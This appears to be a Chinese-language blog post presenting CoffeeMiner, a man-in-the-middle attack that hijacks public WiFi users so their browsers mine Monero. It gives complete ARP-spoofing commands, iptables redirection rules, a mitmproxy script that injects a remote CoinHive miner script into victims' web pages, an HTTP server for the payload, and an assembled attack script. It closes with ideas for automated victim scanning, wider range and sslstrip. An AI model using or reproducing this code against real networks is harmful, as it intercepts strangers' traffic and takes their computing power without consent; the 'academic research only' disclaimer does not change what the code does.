---
title: 劫持公共WIFI挖矿研究
comments: false
date: 2018-03-09 16:10:09
categories: 矿池
tags:
- lucas556
- 矿池
- 门罗币
- CoffeeMiner
- MITM
- CoinHive
img:
---


##警告:本篇文章和文章内提及的项目仅限于学术研究.

这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币.

攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量.

![](/images/coffeeMiner-network-attack.png)

正常WIFI网络配置:

Victim:连接到路由器并浏览页面的机器
Attacker:运行CoffeeMiner的机器,将执行MITM.
gateway/router:正常的路由器

![](/images/scenario01.png)

一旦执行攻击,情况将是:

![](/images/scenario02.png)

攻击者要配置每台机器将执行以下配置：

Victim:
```
ip地址 : 10.0.2.10
子网掩码 : 255.255.255.0
默认网关:10.0.0.15
```
Attacker:
```
ip地址 : 10.0.2.20
子网掩码 : 255.255.255.0
默认网关:10.0.0.15
```
gateway/router:
```
网络0设置dhcp自动获取.
网络1:
ip地址 : 10.0.2.15
子网掩码 : 255.255.255.0
```

## 1.CoffeeMiner的攻击代码
### 1.1 ARP欺骗
中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.
简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情.

随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.
最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行.

如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的.

所以要执行ARP欺骗攻击，我就将使用dsniff库.

```python
arpspoof -i interface -t ipVictim ipGateway
arpspoof -i interface -t ipGateway ipVictim
```
## 1.2 mitmproxy

需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.
为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.
注入挖矿代码的流程如下所示：
```
<script src="http://httpserverIP:8080/script.js"></script>
```
## 1.3 注入器

一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入.

```python
from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse
class Injector:
    def __init__(self, path):
        self.path = path
    def response(self, flow: http.HTTPFlow) -> None:
        if self.path:
            html = BeautifulSoup(flow.response.content, "html.parser")
            print(self.path)
            print(flow.response.headers["content-type"])
            if flow.response.headers["content-type"] == 'text/html':
                script = html.new_tag(
                    "script",
                    src=self.path,
                    type='application/javascript')
                html.body.insert(0, script)
                flow.response.content = str(html).encode("utf8")
                print("Script injected.")
def start():
    parser = argparse.ArgumentParser()
    parser.add_argument("path", type=str)
    args = parser.parse_args()
    return Injector(args.path)
```

### 1.4 HTTP服务器

正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件.

为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：
```python
import http.server
import socketserver
import os
PORT = 8000
web_dir = os.path.join(os.path.dirname(__file__), 'miner_script')
os.chdir(web_dir)
Handler = http.server.SimpleHTTPRequestHandler
httpd = socketserver.TCPServer(("", PORT), Handler)
print("serving at port", PORT)
httpd.serve_forever()
```

上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.
JavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具.

*Coinhive是一个提供恶意JS脚本的网站平台（https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败.


## 2.CoffeeMiner的运行

在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。
为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。
```python
gateway = sys.argv[1]
print("gateway: " + gateway)
# get victims_ip
victims = [line.rstrip('n') for line in open("victims.txt")]
print("victims:")
print(victims)
# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
```

一旦执行了ARP欺骗，只需要运行HTTP服务器即可.
```python
> python3 httpServer.py
```
现在，可以用injector.py运行mitmproxy了.

```python
> mitmdump -s 'injector.py http://httpserverIP:8080/script.js'
```
## 3.CoffeeMiner的最终挖矿脚本

现在把上面解释的所有概念都放在'coffeeMiner.py'脚本中：
```python
import os
import sys
#get gateway_ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)
# get victims_ip
victims = [line.rstrip('n') for line in open("victims.txt")]
print("victims:")
print(victims)
# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")
# start the mitmproxy
os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
```
在'injector.py'脚本中：
```python
from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse
class Injector:
    def __init__(self, path):
        self.path = path
    def response(self, flow: http.HTTPFlow) -> None:
        if self.path:
            html = BeautifulSoup(flow.response.content, "html.parser")
            print(self.path)
            print(flow.response.headers["content-type"])
            if flow.response.headers["content-type"] == 'text/html':
                print(flow.response.headers["content-type"])
                script = html.new_tag(
                    "script",
                    src=self.path,
                    type='application/javascript')
                html.body.insert(0, script)
                flow.response.content = str(html).encode("utf8")
                print("Script injected.")
def start():
    parser = argparse.ArgumentParser()
    parser.add_argument("path", type=str)
    args = parser.parse_args()
    return Injector(args.path)
```
要执行挖矿，只需要执行以下操作：
```python
> python3 coffeeMiner.py RouterIP
```

当然也可以手动运行.

![](/images/coffeeMiner-demo-cutted.gif)


## 结论
正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击.

另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围.

虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中.

附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner
